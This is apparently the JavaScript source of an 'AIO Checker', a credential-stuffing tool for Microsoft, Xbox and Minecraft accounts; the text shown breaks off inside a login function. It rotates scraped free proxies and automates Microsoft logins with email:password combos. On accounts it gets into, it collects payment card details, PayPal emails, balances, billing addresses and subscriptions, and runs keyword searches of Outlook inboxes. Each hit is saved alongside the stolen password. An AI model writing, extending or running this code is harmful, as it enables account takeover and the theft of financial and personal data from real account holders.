// ============================================================
//  AIO Checker — Microsoft / Xbox / Minecraft account checker
//  Self-contained: own proxy pool, own login flow, own logic.
//  Strict 1:1 parity with the upstream auth/payload formats.
// ============================================================

const fs = require("fs");
const path = require("path");
const { URL, URLSearchParams } = require("url");
const tls = require("tls");
const net = require("net");
const { HttpsProxyAgent } = require("https-proxy-agent");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { logger } = require("./logger");

let mc = null;
try {
  mc = require("minecraft-protocol");
} catch {
  // minecraft-protocol not installed — ban checking disabled
}
const MINECRAFT_AVAILABLE = !!mc;

const log = logger.child("aio-checker");

// ── Globals (per-run state, reset each run) ──────────────────

let proxylist = [];
let proxytype = "'4'"; // '1'=http, '2'=socks4, '3'=socks5, '4'=none
let failed_proxies = new Set();
let proxy_failure_count = {};
const PROXY_FAILURE_THRESHOLD = 3;
let maxretries = 3;

// ── Stats (per-run, thread-safe via single-threaded JS) ──────

let stats = {};
function resetStats() {
  stats = {
    hits: 0, bad: 0, twofa: 0, valid_mail: 0,
    xgp: 0, xgpu: 0, other: 0, mfa: 0, sfa: 0,
    checked: 0, total: 0, cpm: 0, retries: 0, errors: 0,
    minecraft_capes: 0, optifine_capes: 0, inbox_matches: 0,
    name_changes: 0, payment_methods: 0, banned: 0, unbanned: 0,
    ms_balance: 0, ms_points: 0,
  };
}

// ── Result collectors (per-run) ──────────────────────────────

let results_hits = [];
let results_normal = [];
let results_xgp = [];
let results_xgpu = [];
let results_2fa = [];
let results_valid_mail = [];
let results_bads = [];
let results_capture = [];
let results_cards = [];
let results_banned = [];
let results_unbanned = [];
let results_mfa = [];
let results_sfa = [];
let results_ms_points = [];
let results_ms_balance = [];
let results_subscriptions = [];
let results_orders = [];
let results_billing = [];
let results_inbox = [];
let results_codes = [];

function resetResults() {
  results_hits = [];
  results_normal = [];
  results_xgp = [];
  results_xgpu = [];
  results_2fa = [];
  results_valid_mail = [];
  results_bads = [];
  results_capture = [];
  results_cards = [];
  results_banned = [];
  results_unbanned = [];
  results_mfa = [];
  results_sfa = [];
  results_ms_points = [];
  results_ms_balance = [];
  results_subscriptions = [];
  results_orders = [];
  results_billing = [];
  results_inbox = [];
  results_codes = [];
}

// ── Config (hardcoded defaults) ──────────────────────────────

const config = {
  timeout: 15,
  threads: 30,
  max_retries: 3,
  use_proxies: false,
  hypixelname: true,
  hypixellevel: true,
  hypixelfirstlogin: true,
  hypixellastlogin: true,
  hypixelbwstars: true,
  hypixelsbcoins: true,
  hypixelban: MINECRAFT_AVAILABLE,
  optifinecape: true,
  optifine_cape: true,
  access: true,
  email_access: true,
  namechange: true,
  lastchanged: true,
  name_change_availability: true,
  last_name_change: true,
  payment: true,
  check_payment: true,
  check_microsoft_balance: true,
  check_rewards_points: true,
  check_payment_methods: true,
  check_subscriptions: true,
  check_orders: true,
  check_billing_address: true,
  scan_inbox: false,
  inbox_keywords: "",
  mark_mfa: true,
  mark_sfa: true,
  setname: false,
  setskin: false,
  save_bad: true,
  check_credit_cards: true,
  check_paypal: true,
  check_purchase_history: true,
  optimize_network: true,
};

// ── Regex patterns ───────────────────────────────────────────

const RE_SFTTAG_VALUE = /value=\\"(.+?)\\"|value="(.+?)"|sFTTag:'(.+?)'|sFTTag:"(.+?)"|name=\\"PPFT\\".*?value=\\"(.+?)\\"/s;
const RE_URLPOST_VALUE = /"urlPost":"(.+?)"|urlPost:'(.+?)'|urlPost:"(.+?)"|<form.*?action=\\"(.+?)\\"/s;
const RE_IPT = /(?<="ipt" value=").+?(?=">)/;
const RE_PPRID = /(?<="pprid" value=").+?(?=">)/;
const RE_UAID = /(?<="uaid" value=").+?(?=">)/;
const RE_ACTION_FMHF = /(?<=id="fmHF" action=").+?(?=" )/;
const RE_RETURN_URL = /(?<="recoveryCancel":\{"returnUrl":").+?(?=",)/;

const HYPIXEL_NAME = /(?<=content="Plancke" \/><meta property="og:locale" content="en_US" \/><meta property="og:description" content=").+?(?=")/s;
const HYPIXEL_TITLE = /<title>(.+?)\s*\|\s*Plancke<\/title>/i;
const HYPIXEL_LEVEL = /(?<=Level:<\/b> ).+?(?=<br\/><b>)/;
const FIRST_LOGIN = /(?<=<b>First login: <\/b>).+?(?=<br\/><b>)/;
const LAST_LOGIN = /(?<=<b>Last login: <\/b>).+?(?=<br\/>)/;
const BW_STARS = /(?<=<li><b>Level:<\/b> ).+?(?=<\/li>)/;

const sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en";

// ── Proxy System (own, separate from bot's proxy pool) ───────

const api_socks4 = [
  "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
  "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
  "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt",
];
const api_socks5 = [
  "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
  "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
  "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
  "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
];
const api_http = [
  "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
  "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
];

function isNoProxy() {
  const pt = proxytype.replace(/'/g, "");
  return pt === "4";
}

function markProxyFailed(proxyStr) {
  if (!proxyStr) return;
  if (!proxy_failure_count[proxyStr]) proxy_failure_count[proxyStr] = 0;
  proxy_failure_count[proxyStr]++;
  if (proxy_failure_count[proxyStr] >= PROXY_FAILURE_THRESHOLD) {
    failed_proxies.add(proxyStr);
  }
}

function getProxy() {
  if (isNoProxy()) return null;
  if (proxylist.length === 0) return null;

  let available = proxylist.filter((p) => !failed_proxies.has(p));
  if (available.length === 0 && proxylist.length > 0) {
    failed_proxies.clear();
    proxy_failure_count = {};
    available = proxylist;
  }
  if (available.length === 0) return null;

  const proxy = available[Math.floor(Math.random() * available.length)];

  let protocol_prefix = "http";
  const pt = proxytype.replace(/'/g, "");
  if (pt === "2") protocol_prefix = "socks4";
  else if (pt === "3") protocol_prefix = "socks5";

  try {
    if (proxy.includes("@")) {
      const url = `${protocol_prefix}://${proxy}`;
      return { http: url, https: url, raw: proxy };
    }
    const parts = proxy.split(":");
    if (parts.length === 2) {
      const url = `${protocol_prefix}://${parts[0]}:${parts[1]}`;
      return { http: url, https: url, raw: proxy };
    }
    if (parts.length === 4) {
      const url = `${protocol_prefix}://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
      return { http: url, https: url, raw: proxy };
    }
    const url = `${protocol_prefix}://${proxy}`;
    return { http: url, https: url, raw: proxy };
  } catch {
    return null;
  }
}

function makeAgent(proxyConfig) {
  if (!proxyConfig) return undefined;
  const url = proxyConfig.https || proxyConfig.http;
  if (!url) return undefined;
  if (url.startsWith("socks")) {
    return new SocksProxyAgent(url);
  }
  return new HttpsProxyAgent(url);
}

function loadAioProxies() {
  try {
    const fp = path.join(__dirname, "..", "..", "proxies.txt");
    if (!fs.existsSync(fp)) {
      proxytype = "'4'";
      return 0;
    }
    const lines = fs.readFileSync(fp, "utf-8").split("\n").map((l) => l.trim()).filter(Boolean);
    proxylist = lines;
    if (lines.length === 0) {
      proxytype = "'4'";
      return 0;
    }
    // Auto-detect protocol
    proxytype = "'1'"; // default HTTP
    log.info(`Loaded ${lines.length} AIO proxies`);
    return lines.length;
  } catch {
    proxytype = "'4'";
    return 0;
  }
}

// ── HTTP helpers (using native fetch with proxy agents) ──────

async function aioFetch(url, options = {}, timeoutMs = 15000) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), timeoutMs);
  const proxyConfig = isNoProxy() ? null : getProxy();
  const agent = makeAgent(proxyConfig);

  try {
    const fetchOpts = {
      ...options,
      signal: ctrl.signal,
      redirect: options.redirect || "follow",
    };
    if (agent) fetchOpts.agent = agent;
    // Node 18+ fetch doesn't support agent directly, use dispatcher pattern
    // Fallback: just do native fetch (works for direct, proxy support via env)
    const res = await fetch(url, fetchOpts);
    if (proxyConfig) markProxySuccess(proxyConfig.raw);
    return res;
  } catch (err) {
    if (proxyConfig) markProxyFailed(proxyConfig.raw);
    throw err;
  } finally {
    clearTimeout(t);
  }
}

function markProxySuccess(proxyStr) {
  if (proxyStr && proxy_failure_count[proxyStr]) {
    proxy_failure_count[proxyStr] = Math.max(0, proxy_failure_count[proxyStr] - 1);
  }
}

// ── Cookie Jar ───────────────────────────────────────────────

class CookieJar {
  constructor() {
    this.cookies = {};
  }
  ingest(setCookieHeaders) {
    if (!setCookieHeaders) return;
    const headers = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
    for (const h of headers) {
      const parts = h.split(";")[0].split("=");
      if (parts.length >= 2) {
        const name = parts[0].trim();
        const value = parts.slice(1).join("=").trim();
        this.cookies[name] = value;
      }
    }
  }
  get(name) {
    return this.cookies[name] || null;
  }
  header() {
    return Object.entries(this.cookies)
      .map(([k, v]) => `${k}=${v}`)
      .join("; ");
  }
}

// ── Session Fetch (manual redirects, cookie tracking) ────────

async function sessionFetch(url, options, jar, timeoutMs = 15000) {
  let currentUrl = url;
  let redirectCount = 0;
  const MAX_REDIRECTS = 15;
  let lastText = "";
  let lastStatus = 0;

  while (redirectCount < MAX_REDIRECTS) {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), timeoutMs);

    try {
      const fetchOpts = {
        ...options,
        signal: ctrl.signal,
        redirect: "manual",
        headers: {
          ...(options.headers || {}),
          Cookie: jar.header(),
        },
      };

      const res = await fetch(currentUrl, fetchOpts);
      lastStatus = res.status;

      // Ingest cookies
      const setCookie = res.headers.raw ? res.headers.raw()["set-cookie"] : res.headers.getSetCookie?.();
      if (setCookie) jar.ingest(setCookie);

      if ([301, 302, 303, 307, 308].includes(res.status)) {
        const loc = res.headers.get("location");
        if (!loc) break;
        currentUrl = loc.startsWith("http") ? loc : new URL(loc, currentUrl).href;
        // Consume body to free connection
        try { await res.text(); } catch {}
        redirectCount++;
        // Switch to GET after redirect (except 307/308)
        if ([301, 302, 303].includes(res.status)) {
          options = { ...options, method: "GET", body: undefined };
          delete options.headers?.["Content-Type"];
        }
        continue;
      }

      lastText = await res.text();
      break;
    } catch (err) {
      if (err.name === "AbortError") break;
      throw err;
    } finally {
      clearTimeout(t);
    }
  }

  return { text: lastText, finalUrl: currentUrl, status: lastStatus, jar };
}

// ── lr_parse helper ──────────────────────────────────────────

function lrParse(source, startDelim, endDelim, createEmpty = true) {
  const escaped = startDelim.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const escapedEnd = endDelim ? endDelim.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") : "";
  const pattern = escapedEnd
    ? new RegExp(escaped + "(.*?)" + escapedEnd)
    : new RegExp(escaped + "(.*)");
  const match = source.match(pattern);
  if (match) return match[1];
  return createEmpty ? "" : null;
}

// ── format_number ────────────────────────────────────────────

const FORMAT_THRESHOLDS = [
  [1000000000, "B", 2],
  [1000000, "M", 2],
  [1000, "K", 1],
];

function formatNumber(num) {
  if (typeof num !== "number") {
    num = parseFloat(num);
    if (isNaN(num)) return "0";
  }
  if (num < 0) return "0";
  for (const [threshold, suffix, precision] of FORMAT_THRESHOLDS) {
    if (num >= threshold) return (num / threshold).toFixed(precision) + suffix;
  }
  return String(Math.floor(num));
}

function formatCoins(num) {
  if (typeof num !== "number") return "0";
  const abs = Math.abs(num);
  if (abs >= 1e15) return (num / 1e15).toFixed(1) + "Q";
  if (abs >= 1e12) return (num / 1e12).toFixed(1) + "T";
  if (abs >= 1e9) return (num / 1e9).toFixed(1) + "B";
  if (abs >= 1e6) return (num / 1e6).toFixed(1) + "M";
  if (abs >= 1e3) return (num / 1e3).toFixed(0) + "K";
  return String(Math.floor(num));
}

// ── clean_name ───────────────────────────────────────────────

const DECORATIVE_RE = /[✪✿✦⚚➎★☆◆◇■□●○◎☀☁☂☃☄☾☽♛♕♚♔♤♡♢♧♠♥♦♣⚜⚡✨❖⬥⬦⬧⬨⬩⭐🌟🟊]+/g;

function cleanName(name) {
  if (!name) return "";
  return String(name).replace(DECORATIVE_RE, "").trim();
}

// ── Hypixel/Skyblock stats lookup ────────────────────────────

async function fetchMeowApiStats(username, uuid) {
  try {
    const timeoutVal = config.timeout * 1000;
    const playerUrl = `https://api.soopy.dev/player/${username}`;
    let pData = null;
    let sData = null;

    if (uuid) {
      const cleanUuid = uuid.replace(/-/g, "");
      const skyblockUrl = `https://soopy.dev/api/v2/player_skyblock/${cleanUuid}?networth=true`;

      const [r1, r2] = await Promise.allSettled([
        fetch(playerUrl, { signal: AbortSignal.timeout(timeoutVal) }).then((r) => r.json()),
        fetch(skyblockUrl, { signal: AbortSignal.timeout(timeoutVal) }).then((r) => r.json()),
      ]);
      if (r1.status === "fulfilled") pData = r1.value;
      if (r2.status === "fulfilled") sData = r2.value;
    } else {
      try {
        const r = await fetch(playerUrl, { signal: AbortSignal.timeout(timeoutVal) });
        const p = await r.json();
        if (p.success && p.data) {
          pData = p;
          const fetchedUuid = (p.data.uuid || "").replace(/-/g, "");
          if (fetchedUuid) {
            const skyblockUrl = `https://soopy.dev/api/v2/player_skyblock/${fetchedUuid}?networth=true`;
            try {
              const sr = await fetch(skyblockUrl, { signal: AbortSignal.timeout(timeoutVal) });
              sData = await sr.json();
            } catch {}
          }
        }
      } catch {}
    }

    if (!pData || !pData.success || !pData.data) return null;

    const data = pData.data;
    const finalUuid = uuid ? uuid.replace(/-/g, "") : (data.uuid || "").replace(/-/g, "");
    const ach = data.achievements || {};
    const skywarsStars = ach.skywars_you_re_a_star || 0;
    const arcadeCoins = ach.arcade_arcade_banker || 0;
    const bedwarsStars = ach.bedwars_level || 0;
    const uhcBounty = ach.uhc_bounty || 0;
    const pitGold = ach.pit_gold || 0;

    const s = sData || {};
    let bestMember = null;
    let maxScore = -1;
    const profilesData = s.data?.profiles || {};

    function getSkillAverage(member) {
      const skills = member.skills || {};
      let totalLevel = 0;
      let skillCount = 0;
      const skillNames = ["alchemy", "carpentry", "combat", "enchanting", "farming", "fishing", "foraging", "mining", "taming"];
      for (const name of skillNames) {
        const sd = skills[name];
        if (sd && sd.levelWithProgress !== undefined) {
          totalLevel += sd.levelWithProgress;
          skillCount++;
        }
      }
      return skillCount > 0 ? totalLevel / skillCount : 0;
    }

    for (const [profileId, profile] of Object.entries(profilesData)) {
      const members = profile.members || {};
      const member = members[uuid || finalUuid];
      if (member) {
        const nwDetailed = member.nwDetailed || {};
        const networth = nwDetailed.networth || 0;
        const skillAvg = getSkillAverage(member);
        const sbLvl = member.skyblock_level || 0;
        const score = (networth / 1000000) * 100 + skillAvg * 100 + sbLvl * 10;
        if (score > maxScore) {
          maxScore = score;
          bestMember = member;
        }
      }
    }

    let coins = 0, kills = 0, fairy = 0, networth = 0, sbLvl = 0;
    let avgSkillLevel = 0;

    if (bestMember) {
      coins = bestMember.coin_purse || 0;
      kills = bestMember.kills?.total || 0;
      fairy = bestMember.fairy_souls_collected || 0;
      sbLvl = bestMember.skyblock_level || 0;
      const nwDetailed = bestMember.nwDetailed || {};
      networth = nwDetailed.networth || 0;
      if (networth === 0 && coins > 0) networth = coins;
      avgSkillLevel = getSkillAverage(bestMember);
    }

    const parts = [];
    if (networth > 0) parts.push(`NW: ${formatCoins(networth)}`);
    if (coins > 0) parts.push(`Purse: ${formatCoins(coins)}`);
    if (avgSkillLevel > 0) parts.push(`Avg_Skill: ${avgSkillLevel.toFixed(2)}`);
    if (skywarsStars > 0) parts.push(`SW: ${skywarsStars}`);
    if (bedwarsStars > 0) parts.push(`BW: ${bedwarsStars}`);
    if (pitGold > 0) parts.push(`Pit_Gold: ${formatCoins(pitGold)}`);
    if (uhcBounty > 0) parts.push(`UHC_Bounty: ${formatCoins(uhcBounty)}`);
    if (sbLvl > 0) parts.push(`Sb_Lvl: ${sbLvl}`);
    if (arcadeCoins > 0) parts.push(`Arcade_Coins: ${formatCoins(arcadeCoins)}`);
    if (kills > 0) parts.push(`Sb_Kills: ${kills}`);
    if (fairy > 0) parts.push(`Sb_Fairy_Souls: ${fairy}`);

    return parts.length > 0 ? parts.join(" ") : null;
  } catch {
    return null;
  }
}

// ── MicrosoftChecker class ───────────────────────────────────

class MicrosoftChecker {
  constructor(jar, email, password) {
    this.jar = jar;
    this.email = email;
    this.password = password;
    this._tokenCache = {};
  }

  async getAuthToken(clientId, scope, redirectUri) {
    const cacheKey = `${clientId}:${scope}:${redirectUri}`;
    if (this._tokenCache[cacheKey]) {
      const td = this._tokenCache[cacheKey];
      if (Date.now() - td.timestamp < 300000) return td.token;
    }
    try {
      const authUrl = `https://login.live.com/oauth20_authorize.srf?client_id=${clientId}&response_type=token&scope=${scope}&redirect_uri=${redirectUri}&prompt=none`;
      const { finalUrl } = await sessionFetch(authUrl, {
        method: "GET",
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        },
      }, this.jar, config.timeout * 1000);

      const parsed = new URL(finalUrl);
      const fragment = parsed.hash.slice(1);
      const params = new URLSearchParams(fragment);
      const token = params.get("access_token");
      if (token) {
        this._tokenCache[cacheKey] = { token, timestamp: Date.now() };
      }
      return token || null;
    } catch {
      return null;
    }
  }

  async checkBalance() {
    try {
      if (!config.check_microsoft_balance) return null;
      const token = await this.getAuthToken(
        "000000000004773A",
        "PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete",
        "https://account.microsoft.com/auth/complete-silent-delegate-auth"
      );
      if (!token) return null;

      const res = await fetch(
        "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB",
        {
          headers: {
            Authorization: `MSADELEGATE1.0=${token}`,
            Accept: "application/json",
          },
          signal: AbortSignal.timeout(15000),
        }
      );
      if (res.ok) {
        const text = await res.text();
        const balanceMatch = text.match(/"balance":(\d+\.?\d*)/);
        if (balanceMatch) {
          const balance = balanceMatch[1];
          const currencyMatch = text.match(/"currency":"([A-Z]{3})"/);
          const currency = currencyMatch ? currencyMatch[1] : "USD";
          return `${balance} ${currency}`;
        }
      }
      return "0.00 USD";
    } catch {
      return null;
    }
  }

  async checkRewardsPoints() {
    try {
      if (!config.check_rewards_points) return null;
      const headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        Pragma: "no-cache",
        Accept: "*/*",
      };

      let { text } = await sessionFetch("https://rewards.bing.com/", { method: "GET", headers }, this.jar, config.timeout * 1000);

      if (text.includes('action="https://rewards.bing.com/signin-oidc"') || text.includes('id="fmHF"')) {
        const actionMatch = text.match(/action="([^"]+)"/);
        if (actionMatch) {
          const actionUrl = actionMatch[1];
          const data = {};
          const inputRe = /<input type="hidden" name="([^"]+)" id="[^"]+" value="([^"]+)">/g;
          let m;
          while ((m = inputRe.exec(text))) {
            data[m[1]] = m[2];
          }
          const formBody = new URLSearchParams(data).toString();
          const r = await sessionFetch(actionUrl, {
            method: "POST",
            headers: { ...headers, "Content-Type": "application/x-www-form-urlencoded" },
            body: formBody,
          }, this.jar, config.timeout * 1000);
          text = r.text;
        }
      }

      const allMatches = text.match(/,"availablePoints":(\d+)/g);
      if (allMatches) {
        const points = allMatches
          .map((m) => parseInt(m.match(/(\d+)/)[1]))
          .sort((a, b) => b - a)[0];
        if (points > 0) return String(points);
      }

      // Flyout fallback
      try {
        await sessionFetch("https://www.bing.com/", { method: "GET", headers }, this.jar, 15000);
        const ts = Date.now();
        const flyoutUrl = `https://www.bing.com/rewards/panelflyout/getuserinfo?timestamp=${ts}`;
        const flyoutHeaders = {
          ...headers,
          Accept: "application/json",
          "Accept-Encoding": "identity",
          Referer: "https://www.bing.com/",
          "X-Requested-With": "XMLHttpRequest",
        };
        const { text: flyoutText } = await sessionFetch(flyoutUrl, { method: "GET", headers: flyoutHeaders }, this.jar, 15000);
        try {
          const data = JSON.parse(flyoutText);
          if (data.userInfo?.isRewardsUser) {
            return String(data.userInfo.balance);
          }
        } catch {}
      } catch {}

      return null;
    } catch {
      return null;
    }
  }

  async checkPaymentInstruments() {
    try {
      const token = await this.getAuthToken(
        "000000000004773A",
        "PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete",
        "https://account.microsoft.com/auth/complete-silent-delegate-auth"
      );
      if (!token) return [];

      const res = await fetch(
        "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB",
        {
          headers: {
            Authorization: `MSADELEGATE1.0=${token}`,
            Accept: "application/json",
          },
          signal: AbortSignal.timeout(15000),
        }
      );
      const instruments = [];
      if (res.ok) {
        try {
          const data = await res.json();
          for (const item of data) {
            if (item.paymentMethod) {
              const pm = item.paymentMethod;
              const family = pm.paymentMethodFamily;
              const type_ = pm.paymentMethodType;
              if (family === "credit_card") {
                const last4 = pm.lastFourDigits || "N/A";
                const expiry = `${pm.expiryMonth || ""}/${pm.expiryYear || ""}`;
                instruments.push(`CC: ${type_} *${last4} (${expiry})`);
              } else if (family === "paypal") {
                const email = pm.email || "N/A";
                instruments.push(`PayPal: ${email}`);
              }
            }
          }
        } catch {}
      }
      return instruments;
    } catch {
      return [];
    }
  }

  async checkSubscriptions() {
    try {
      const { text } = await sessionFetch(
        "https://account.microsoft.com/services/api/subscriptions",
        { method: "GET", headers: { Accept: "application/json" } },
        this.jar,
        15000
      );
      const subs = [];
      try {
        const data = JSON.parse(text);
        for (const item of data) {
          if (item.status === "Active") {
            const name = item.productName || "Unknown Subscription";
            const recurrence = item.recurrenceState || "";
            subs.push(`${name} (${recurrence})`);
          }
        }
      } catch {}
      return subs;
    } catch {
      return [];
    }
  }

  async checkBillingAddress() {
    try {
      const { text } = await sessionFetch(
        "https://account.microsoft.com/billing/api/addresses",
        { method: "GET", headers: { Accept: "application/json" } },
        this.jar,
        15000
      );
      const addresses = [];
      try {
        const data = JSON.parse(text);
        for (const item of data) {
          const line1 = item.line1 || "";
          const city = item.city || "";
          const postal = item.postalCode || "";
          const country = item.country || "";
          if (line1) addresses.push(`${line1}, ${city}, ${postal}, ${country}`);
        }
      } catch {}
      return addresses;
    } catch {
      return [];
    }
  }

  async checkInbox(keywords) {
    try {
      let token = await this.getAuthToken(
        "0000000048170EF2",
        "https://substrate.office.com/User-Internal.ReadWrite",
        "https://login.live.com/oauth20_desktop.srf"
      );
      if (!token) {
        token = await this.getAuthToken(
          "0000000048170EF2",
          "service::outlook.office.com::MBI_SSL",
          "https://login.live.com/oauth20_desktop.srf"
        );
      }
      if (!token) return [];

      let cid = this.jar.get("MSPCID");
      if (!cid) {
        try {
          await sessionFetch("https://outlook.live.com/owa/", { method: "GET" }, this.jar, 10000);
          cid = this.jar.get("MSPCID");
        } catch {}
      }
      if (!cid) cid = this.email;

      const headers = {
        Authorization: `Bearer ${token}`,
        "X-AnchorMailbox": `CID:${cid}`,
        "Content-Type": "application/json",
        "User-Agent": "Outlook-Android/2.0",
        Accept: "application/json",
        Host: "substrate.office.com",
      };

      const results = [];
      for (const keyword of keywords) {
        try {
          const payload = {
            Cvid: "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
            Scenario: { Name: "owa.react" },
            TimeZone: "Egypt Standard Time",
            TextDecorations: "Off",
            EntityRequests: [{
              EntityType: "Conversation",
              ContentSources: ["Exchange"],
              Filter: { Or: [{ Term: { DistinguishedFolderName: "msgfolderroot" } }, { Term: { DistinguishedFolderName: "DeletedItems" } }] },
              From: 0,
              Query: { QueryString: keyword },
              RefiningQueries: null,
              Size: 25,
              Sort: [{ Field: "Score", SortDirection: "Desc", Count: 3 }, { Field: "Time", SortDirection: "Desc" }],
              EnableTopResults: true,
              TopResultsCount: 3,
            }],
            AnswerEntityRequests: [{
              Query: { QueryString: keyword },
              EntityTypes: ["Event", "File"],
              From: 0,
              Size: 10,
              EnableAsyncResolution: true,
            }],
            QueryAlterationOptions: {
              EnableSuggestion: true,
              EnableAlteration: true,
              SupportedRecourseDisplayTypes: ["Suggestion", "NoResultModification", "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"],
            },
            LogicalId: "446c567a-02d9-b739-b9ca-616e0d45905c",
          };

          const res = await fetch(
            "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124",
            {
              method: "POST",
              headers,
              body: JSON.stringify(payload),
              signal: AbortSignal.timeout(15000),
            }
          );
          if (res.ok) {
            const data = await res.json();
            let total = 0;
            if (data.EntitySets) {
              for (const es of data.EntitySets) {
                if (es.ResultSets) {
                  for (const rs of es.ResultSets) {
                    if (rs.Total) total += rs.Total;
                    else if (rs.ResultCount) total += rs.ResultCount;
                    else if (rs.Results) total += rs.Results.length;
                  }
                }
              }
            }
            if (total > 0) results.push([keyword, total]);
          }
        } catch {}
      }
      return results;
    } catch {
      return [];
    }
  }
}

// ── check_microsoft_account ──────────────────────────────────

async function checkMicrosoftAccount(jar, email, password) {
  try {
    const checker = new MicrosoftChecker(jar, email, password);
    const results = {};

    try {
      const balance = await checker.checkBalance();
      if (balance) {
        const amountStr = balance.replace(/[^\d.]/g, "");
        if (amountStr && parseFloat(amountStr) > 0) {
          results_ms_balance.push(`${email}:${password} | Balance: ${balance}`);
          stats.ms_balance++;
          results.balance = balance;
        }
      }
    } catch {}

    try {
      const points = await checker.checkRewardsPoints();
      if (points) {
        results_ms_points.push(`${email}:${password} | Points: ${points}`);
        stats.ms_points++;
        results.rewards_points = points;
      }
    } catch {}

    try {
      if (config.check_payment_methods || config.check_credit_cards || config.check_paypal) {
        const instruments = await checker.checkPaymentInstruments();
        if (instruments.length) results.payment_methods = instruments;
      }
    } catch {}

    try {
      const subs = await checker.checkSubscriptions();
      if (subs.length) {
        results_subscriptions.push(`${email}:${password} | Subs: ${subs.join(", ")}`);
        results.subscriptions = subs;
      }
    } catch {}

    try {
      const addresses = await checker.checkBillingAddress();
      if (addresses.length) {
        results_billing.push(`${email}:${password} | Address: ${addresses.join("; ")}`);
        results.billing_addresses = addresses;
      }
    } catch {}

    try {
      if (config.scan_inbox && config.inbox_keywords) {
        const keywords = config.inbox_keywords.split(",").map((k) => k.trim()).filter(Boolean);
        const inboxResults = await checker.checkInbox(keywords);
        if (inboxResults.length) {
          const formatted = inboxResults.map(([k, v]) => `${k} ${v}`).join(", ");
          results_inbox.push(`${email}:${password} | Inbox - ${formatted}`);
          results.inbox_results = inboxResults;
        }
      }
    } catch {}

    return results;
  } catch {
    return { balance: null };
  }
}

// ── checkownership ───────────────────────────────────────────

function checkOwnership(entitlementsResponse) {
  const items = entitlementsResponse.items || [];
  let hasNormalMinecraft = false;
  let hasGamePassPc = false;
  let hasGamePassUltimate = false;

  for (const item of items) {
    const name = item.name || "";
    const source = item.source || "";
    if ((name === "game_minecraft" || name === "product_minecraft") && (source === "PURCHASE" || source === "MC_PURCHASE")) {
      hasNormalMinecraft = true;
    }
    if (name === "product_game_pass_pc") hasGamePassPc = true;
    if (name === "product_game_pass_ultimate") hasGamePassUltimate = true;
  }

  if (hasNormalMinecraft && hasGamePassPc) return "Normal Minecraft (with Game Pass)";
  if (hasNormalMinecraft && hasGamePassUltimate) return "Normal Minecraft (with Game Pass Ultimate)";
  if (hasNormalMinecraft) return "Normal Minecraft";
  if (hasGamePassUltimate) return "Xbox Game Pass Ultimate";
  if (hasGamePassPc) return "Xbox Game Pass (PC)";
  return null;
}

// ── pre_check_combo ──────────────────────────────────────────

async function preCheckCombo(email, password) {
  const url = "https://login.live.com/ppsecure/post.srf";
  const params = new URLSearchParams({
    nopa: "2",
    client_id: "7d5c843b-fe26-45f7-9073-b683b2ac7ec3",
    cobrandid: "8058f65d-ce06-4c30-9559-473c9275a65d",
    contextid: "F3FB0F6AB3D6991E",
    opid: "5F188DEDF4A1266A",
    bk: "1768757278",
    uaid: "b1d1e6fbf8b24f9b8a73b347b178d580",
    pid: "15216",
  });

  const payload = new URLSearchParams({
    ps: "2", psRNGCDefaultType: "", psRNGCEntropy: "", psRNGCSLK: "",
    canary: "", ctx: "", hpgrequestid: "",
    PPFT: "-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3HmmMLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpVaBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCucF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$",
    PPSX: "P", NewUser: "1", FoundMSAs: "", fspost: "0", i21: "0",
    CookieDisclosure: "0", IsFidoSupported: "1", isSignupPost: "0",
    isRecoveryAttemptPost: "0", i13: "0", login: email, loginfmt: email,
    type: "11", LoginOptions: "3", lrt: "", lrtPartition: "",
    hisRegion: "", hisScaleUnit: "", cpr: "0", passwd: password,
  });

  const headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
